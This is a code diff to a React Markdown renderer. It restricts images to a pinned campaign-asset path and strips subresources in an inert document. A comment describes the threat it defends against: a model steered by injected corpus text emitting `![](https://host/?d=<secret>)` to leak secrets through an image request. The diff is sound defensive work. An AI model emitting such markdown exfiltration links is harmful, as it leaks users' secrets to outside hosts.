@@ -38,10 +38,10 @@ export interface MarkdownProps {
   /**
    * Decision X-10 — opt-in, and off for today's chat channels so their
    * behaviour is unchanged. When on, nothing rendered here may fetch anything
-   * off-origin: images survive only as same-origin asset references, every
-   * other subresource element and attribute is dropped, and a `style` carrying
-   * `url()` loses the attribute. Links are untouched — a link is a navigation
-   * the reader chooses, not a subresource the page loads.
+   * by itself: an image survives only as a reference to a campaign asset this
+   * origin serves, every other subresource element and attribute is dropped,
+   * and a `style` carrying `url()` loses the attribute. Links are untouched — a
+   * link is a navigation the reader chooses, not a subresource the page loads.
    *
    * The Workbench turns it on because a model steered by injected corpus text
    * can emit `![](https://host/?d=<secret>)`, and this component would
@@ -57,22 +57,36 @@ const SUBRESOURCE_ELEMENTS = 'iframe, frame, frameset, object, embed, video, aud
 const SUBRESOURCE_ATTRIBUTES = ['srcset', 'poster', 'background', 'data', 'lowsrc']
 
 /**
- * True for a reference that resolves to this page's own origin over http(s) —
- * `/assets/…`, `./x.png`. False for a remote host, a protocol-relative `//host`
- * (whose origin differs), and for `data:`, `blob:` and `javascript:`, none of
- * which has this origin.
+ * The one route a GM surface may load an image from: the campaign asset route of
+ * the media decision (MS-7, `GET /campaigns/{campaign_id}/assets/{asset_id}`).
+ * "Same origin" alone is too wide — every GET this service answers would become
+ * something a steered model can make the GM's browser request — so the path is
+ * pinned and a query or fragment, which could carry text out, is refused.
  */
-function isSameOriginReference(value: string | null): boolean {
+const CAMPAIGN_ASSET_PATH = /^\/campaigns\/[^/]+\/assets\/[^/]+$/
+
+/**
+ * True for a reference to a campaign asset on this page's own origin. False for
+ * a remote host, a protocol-relative `//host` (whose origin differs), `data:`,
+ * `blob:` and `javascript:` (none of which has this origin), and for any other
+ * same-origin path.
+ */
+function isAssetReference(value: string | null): boolean {
   if (value === null || value === '') return false
   try {
     const url = new URL(value, document.baseURI)
-    return (url.protocol === 'http:' || url.protocol === 'https:') && url.origin === window.location.origin
+    return (
+      url.origin === window.location.origin
+      && CAMPAIGN_ASSET_PATH.test(url.pathname)
+      && url.search === ''
+      && url.hash === ''
+    )
   } catch {
     return false
   }
 }
 
-/** X-10, applied to already-sanitized DOM. */
+/** X-10, applied to already-sanitized DOM — in a document that cannot fetch (see `renderMarkdown`). */
 function stripRemoteSubresources(host: HTMLElement): void {
   for (const element of host.querySelectorAll(SUBRESOURCE_ELEMENTS)) element.remove()
   for (const element of host.querySelectorAll('*')) {
@@ -81,10 +95,10 @@ function stripRemoteSubresources(host: HTMLElement): void {
     const style = element.getAttribute('style')
     if (style !== null && style.toLowerCase().includes('url(')) element.removeAttribute('style')
   }
-  // An image is kept only when it points at an asset this origin serves; there
-  // is no half-measure, because an <img> with a stripped src is a broken icon.
+  // An image is kept only when it points at a campaign asset this origin serves;
+  // there is no half-measure, because an <img> with a stripped src is a broken icon.
   for (const image of host.querySelectorAll('img')) {
-    if (!isSameOriginReference(image.getAttribute('src'))) image.remove()
+    if (!isAssetReference(image.getAttribute('src'))) image.remove()
   }
 }
 
@@ -103,14 +117,18 @@ function stripRemoteSubresources(host: HTMLElement): void {
  */
 function renderMarkdown(source: string, noRemoteSubresources: boolean): string {
   const raw = marked.parse(source, { async: false, gfm: true, breaks: true })
-  if (!noRemoteSubresources) return DOMPurify.sanitize(raw)
-  // A fragment rather than a string, so the X-10 pass reads attributes through
-  // the DOM instead of a regex — the same reason the tests assert on nodes.
-  const fragment = DOMPurify.sanitize(raw, { RETURN_DOM_FRAGMENT: true })
-  const host = document.createElement('div')
-  host.append(fragment)
-  stripRemoteSubresources(host)
-  return host.innerHTML
+  const clean = DOMPurify.sanitize(raw)
+  if (!noRemoteSubresources) return clean
+  // The X-10 pass reads attributes through the DOM rather than a regex, and it
+  // must do so in an INERT document. An <img> starts loading the moment it is
+  // created in, or adopted by, a document with a browsing context — attached to
+  // the page or not — so stripping nodes of the live document (which is where
+  // DOMPurify's RETURN_DOM_FRAGMENT puts them) would strip after the request
+  // had already left. A document from `createHTMLDocument` fetches nothing.
+  const inert = document.implementation.createHTMLDocument('')
+  inert.body.innerHTML = clean
+  stripRemoteSubresources(inert.body)
+  return inert.body.innerHTML
 }
 
 export function Markdown({ source, className, noRemoteSubresources = false }: MarkdownProps): React.JSX.Element {
